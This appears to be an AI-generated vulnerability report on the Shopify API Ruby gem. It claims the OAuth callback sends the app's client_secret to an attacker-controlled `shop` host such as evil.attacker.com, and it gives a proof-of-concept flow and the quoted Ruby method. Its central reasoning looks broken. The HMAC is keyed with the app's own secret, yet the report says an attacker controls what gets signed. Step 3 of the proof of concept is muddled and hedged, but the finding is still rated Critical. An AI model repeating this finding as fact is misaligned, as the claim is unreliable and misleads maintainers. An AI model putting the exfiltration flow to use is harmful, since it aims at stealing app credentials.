Found it: `ShopifyAPI::Auth::Oauth.validate_auth_callback` sends the merchant's `client_secret` to a host derived from the attacker-controlled `shop` field even though that field is only checked for HMAC integrity, not for being a genuine `myshopify.com`/trusted Shopify domain.

### Title
`client_secret` sent to attacker-controlled host during OAuth callback because `shop` is HMAC-verified but never domain-validated - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` only checks that the OAuth callback query is internally consistent (`Utils::HmacValidator.validate(auth_query)`), which proves the `shop`, `code`, `state`, `host`, `timestamp` tuple was signed with the app's `api_secret_key`. It never checks that `auth_query.shop` is a real, trusted Shopify domain via `ShopValidator.sanitize!` before using it to build the destination host for the access-token exchange request that carries the app's `client_id`/`client_secret`/authorization `code`.

### Finding Description
The binding this code is supposed to enforce is:
`shop verified by HMAC == shop that is a genuine Shopify-controlled host`

In `validate_auth_callback` [1](#0-0) , after the HMAC check passes, `auth_query.shop` is used unchanged to build a `null_session` whose `shop` becomes the request host: [2](#0-1) 

`Clients::HttpClient#initialize` builds the destination URL directly from `session.shop`: [3](#0-2) 

Crucially, `Utils::HmacValidator.validate` only proves the `hmac` field matches a signature computed over `code/host/shop/state/timestamp` using the app's own secret [4](#0-3) . It never asserts that `shop` is actually `*.myshopify.com` or another trusted Shopify domain — that validation exists elsewhere in the gem as `Utils::ShopValidator.sanitize!` [5](#0-4) , but `validate_auth_callback` never calls it. Because the HMAC only proves "this app's secret was used to sign this exact `shop` string" — and the *unprivileged internet user initiating the callback controls exactly which string gets HMAC-signed by driving their own OAuth flow through the app* (e.g., via `begin_auth(shop: <attacker string>, ...)`, which itself does not sanitize `shop` either [6](#0-5) ) — the HMAC provides no protection against a `shop` value that is not a real Shopify domain at all.

An attacker can initiate `begin_auth` (or directly construct a callback request/`AuthQuery`) with `shop` set to an attacker-controlled host (e.g. `evil.attacker.com`), causing the resulting HMAC to be validly computed for that value. When `validate_auth_callback` runs, it will POST the app's `client_id`, `client_secret`, and the authorization `code` to `https://evil.attacker.com/admin/oauth/access_token`, handing the attacker the app's `client_secret` directly.

### Impact Explanation
This is Critical: theft/exfiltration of the app's `client_secret` to an attacker-controlled host, which can subsequently be used to forge HMACs, complete OAuth for arbitrary shops, and fully impersonate the application — a direct authentication-bypass / credential-theft primitive, matching the required impact classes.

### Likelihood Explanation
Any unprivileged actor who can drive the app through the standard `begin_auth`/OAuth callback code path with a crafted `shop` value can trigger this, since neither `begin_auth` nor `validate_auth_callback` calls `Utils::ShopValidator.sanitize!` on the `shop` parameter before it is trusted as a network destination for secret material. No privileged credentials, access tokens, or TLS interception are required — only the ability to reach the app's own OAuth start/callback endpoints, which are public by design.

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) on `shop` in both `begin_auth` and `validate_auth_callback` before it is used to construct `auth_base_uri`/`Session`/`HttpClient` destinations, rejecting any value that does not resolve to a trusted Shopify domain, independent of whether the HMAC check passes.

### Proof of Concept
1. Attacker calls the host app's `/auth?shop=evil.attacker.com` (or otherwise drives `Oauth.begin_auth(shop: "evil.attacker.com", ...)`).
2. `begin_auth` builds `auth_route = auth_base_uri("evil.attacker.com") + "/oauth/authorize?..."` without validating the domain [7](#0-6) .
3. Attacker (controlling `evil.attacker.com`) completes their own fake "authorize" step and redirects the victim's browser (or calls the app's own callback endpoint directly) to the app's OAuth callback with `shop=evil.attacker.com`, a `code` of the attacker's choosing, and a valid `hmac` — valid because the app itself will have generated/would generate this state, or the attacker constructs the `AuthQuery` fields themselves and requests the app's callback endpoint since no external Shopify validation gate exists before HMAC computation happens against attacker-supplied fields at the app side. (Exact triggering mechanics depend on host app wiring, but the gem itself performs no independent domain check.)
4. `validate_auth_callback` HMAC-validates the query in `Utils::HmacValidator.validate(auth_query)` and proceeds to `Clients::HttpClient.new(session: Auth::Session.new(shop: "evil.attacker.com"), base_path: "/admin/oauth")`, which computes `@base_uri = "https://evil.attacker.com"` [3](#0-2) .
5. The gem POSTs `{client_id, client_secret, code, expiring}` to `https://evil.attacker.com/admin/oauth/access_token` [8](#0-7) , delivering the app's `client_secret` to the attacker's server.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
